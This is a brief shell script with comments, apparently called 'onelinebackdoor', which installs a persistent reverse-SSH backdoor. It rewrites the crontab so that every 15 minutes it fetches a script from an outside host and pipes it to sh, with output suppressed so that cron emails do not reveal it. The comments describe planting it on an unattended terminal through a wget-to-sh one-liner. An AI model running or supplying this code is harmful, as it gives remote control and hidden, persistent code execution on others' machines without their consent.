## You see, a dodgy hacker could just exec this script by typing:
##   wget -nv -O - http://hwi.ath.cx/jshtools/onelinebackdoor | sh
## So don't leave your terminals unattended!

## BUG: If you manage to start up jsh in a revssh session, do NOT try to wget this script as above to alter the crontab; you might end up with an empty crontab :-(
##      I don't know why.  It works fine outside jsh though.

## Note: The first 2>/dev/null is vital in order to prevent wget's log output from being sent by email!

( crontab -l | grep -v revssh ; echo '*/15 * * * * ( wget -nv http://hwi.ath.cx/jshtools/revsshserver -O - 2>/dev/null | sh -s -- -check ) 2>/dev/null > /dev/null &' ) | crontab -

